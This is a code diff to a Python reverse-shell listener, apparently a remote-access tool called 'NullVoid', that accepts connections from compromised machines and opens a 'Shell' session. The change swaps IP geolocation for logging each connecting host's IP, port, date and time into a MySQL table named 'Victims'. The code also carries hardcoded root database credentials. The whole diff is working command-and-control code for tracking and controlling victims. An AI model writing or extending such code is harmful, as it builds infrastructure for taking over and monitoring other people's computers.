@@ -2,11 +2,11 @@ import socket
 import os
 import time
 import mysql.connector as sql
-import geocoder
+from datetime import date
 
 db = sql.connect(user='root', password='password', host='localhost', database='NullVoid')
 db_cur = db.cursor()
-db_cur.execute("CREATE TABLE Victims(IP_Addr varchar(30) NOT NULL, Location varchar(50), Latitude varchar(50), Longitude varchar(50)")
+db_cur.execute("CREATE TABLE IF NOT EXISTS Victims(IP_Addr varchar(50) NOT NULL, Port varchar(50), Date varchar(50), Time varchar(50)")
 
 
 def connect():
@@ -19,13 +19,15 @@ def connect():
     conn, addr = s.accept()
     print ('[+] We got a connection from: ', addr)
     
-    g = geocoder.ip(addr)
-    location = g.city
-    latitude = g.latlng[0]
-    longitude = g.latlng[1]
-    query = "INSERT INTO Victims(IP_Addr, Location, Latitude, Longitude) VALUES (%s, %s, %s, %s)"
-    values = (addr, location, latitude, longitude)
+    IP = addr[0]
+    Port = addr[1]
+    Date = date.today()
+    t = time.localtime()
+    Time = time.strftime("%H:%M:%S", t) 
+    query = "INSERT INTO Victims(IP_Addr, Port, Date, Time) VALUES (%s, %s, %s, %s)"
+    values = (IP, Port, Date, Time)
     db_cur.execute(query, values)
+    db.commit()
 
     cwd = 'Shell'
     r = conn.recv(5120).decode('utf-8')
